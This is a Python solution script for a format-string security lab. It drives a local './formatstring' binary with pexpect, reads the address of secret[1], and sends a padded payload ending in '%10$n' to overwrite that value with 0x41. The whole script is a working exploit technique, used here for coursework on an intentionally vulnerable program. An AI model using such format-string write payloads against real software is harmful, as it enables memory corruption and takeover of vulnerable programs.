# This script shows how to complete task 2iii of the Format String lab.
# The program does not automate conversion of the memory address for the inputs.
# Instead it requires the user to manually convert the memory address from hex
# to ASCII chars. 
# To overwrite the memory address to a value of our choosing, the method is similar
# to Task 1, except that there are already 4 characters before the string formatter
# so 4 is subtracted from the required decimal integer input (shown for the purposes
# of this code).
# Again, the code here replaces the value of secret[1] with 0x41, which is 'A'

from __future__ import print_function

import os
import struct
import pexpect

targetfile = './formatstring'

# Iterate through formatstr-root 'counter' times.
p = pexpect.spawn(targetfile)

# Echo initial output
for i in range(0,5):
	echo = p.readline()
	print(echo,end='')
	# Grab memory location of secret[1]
	if (i == 3): # 3 gives secret[1]
		sec_Loc = echo[25:33]
# Format memory location to repace spaces with 0's
sec_Loc = sec_Loc.replace(' ','0')

# Split into bytes and reverse characters
sec_Mem = [sec_Loc[6:], sec_Loc[4:6], sec_Loc[2:4], sec_Loc[:2]];
print('> The memory address of secret[1] is: ' + sec_Loc + '.')
print('> So the individual bytes are:\n'+sec_Loc[6:]+' '+sec_Loc[4:6]+' '+sec_Loc[2:4]+' '+sec_Loc[:2]) 
print('> (The bytes are in reverse order as they are read onto the stack backwards)')
print('> Some hex values cannot be converted to simple characters. If this is the case\n for the above memory address then please refer to the technical report.')
print('> Convert each of these values into chars and enter them in order below: ')
userin = str(raw_input())
input = ('A'*(65-4)) + userin.replace(' ','') + '%10$n'
print('> Sending: ' + input)
p.sendline(input)

for i in range(0,5):
       	echop = p.readline()
	if not echop:
		print('No return from program - it may have crashed!')
		break
p.close()
